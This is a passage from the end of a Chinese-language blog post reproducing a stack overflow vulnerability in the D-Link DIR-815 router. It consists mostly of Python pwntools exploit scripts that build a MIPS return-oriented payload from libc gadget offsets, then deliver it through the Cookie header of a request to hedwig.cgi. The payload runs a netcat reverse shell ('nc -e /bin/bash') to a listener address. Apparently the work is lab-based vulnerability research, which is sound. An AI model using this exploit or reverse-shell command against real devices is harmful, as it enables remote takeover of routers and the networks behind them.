</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget2</span><span class="p">)</span> 		<span class="c1"># s5</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>					<span class="c1"># $s6 - $fp</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget1</span><span class="p">)</span> 		<span class="c1"># ra  move $t9, $s5 ; jalr $s5;addiu $s0, 1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">cmd</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fd</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></div><p><img loading="lazy" src="image-20221023175756580.png" alt="image-20221023175756580" srcset="image-20221023175756580.png?size=small, image-20221023175756580.png?size=medium 1.5x, image-20221023175756580.png?size=large 2x" data-title="image-20221023175756580" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="http请求发payload" class="heading-element"><span>http请求发payload：</span>
  <a href="#http%e8%af%b7%e6%b1%82%e5%8f%91payload" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;nc -e /bin/bash 192.168.111.138 8888&#39;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x77f34000</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr_1</span> <span class="o">=</span> <span class="mh">0x53200</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget1</span> <span class="o">=</span> <span class="mh">0x32A98</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0x169C4</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000169C4                 addiu   $s2, $sp, 0x170+var_158//0x18</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000169C8                 move    $a2, $v1</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000169CC                 move    $t9, $s0</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000169D0                 jalr    $t9 ; mempcpy</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000169D4                 move    $a0, $s2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">973</span> 							<span class="c1"># 1009-4*9</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_addr_1</span><span class="p">)</span> 	<span class="c1"># s0  system_addr- 1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget2</span><span class="p">)</span> 		<span class="c1"># s1  </span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget1</span><span class="p">)</span> 		<span class="c1"># ra  addiu $s0, 1 ; jalr $s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">cmd</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.100.2:4444/hedwig.cgi&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;aaa&#34;</span> <span class="p">:</span> <span class="s2">&#34;pwner&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Cookie&#34;</span>        <span class="p">:</span> <span class="sa">b</span><span class="s2">&#34;uid=&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Type&#34;</span>  <span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Length&#34;</span><span class="p">:</span> <span class="s2">&#34;1111&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span></span></span></code></pre></div><p>也是可以打通的：</p>
<p><img loading="lazy" src="image-20221023191111373.png" alt="image-20221023191111373" srcset="image-20221023191111373.png?size=small, image-20221023191111373.png?size=medium 1.5x, image-20221023191111373.png?size=large 2x" data-title="image-20221023191111373" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2022-10-23 00:00:00">更新于 2022-10-23&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/dir815/" data-title="DLink 815路由器栈溢出漏洞分析与复现" data-hashtags="漏洞复现"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/dir815/" data-hashtag="漏洞复现"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/dir815/" data-title="DLink 815路由器栈溢出漏洞分析与复现"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-tag" title="标签 - 漏洞复现">漏洞复现</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/2022-9-wincode1/" class="post-nav-item" rel="prev" title="Windows Program Learn_0x1"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Windows Program Learn_0x1</a>
      <a href="/posts/2023-1-winkernel%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/" class="post-nav-item" rel="next" title="Windows内核(三)——系统调用">Windows内核(三)——系统调用<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.126.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.8-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
              <a href="/">Ghostasky</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.8-RC"};</script><script src="/js/theme.min.js" defer></script></body>
</html>
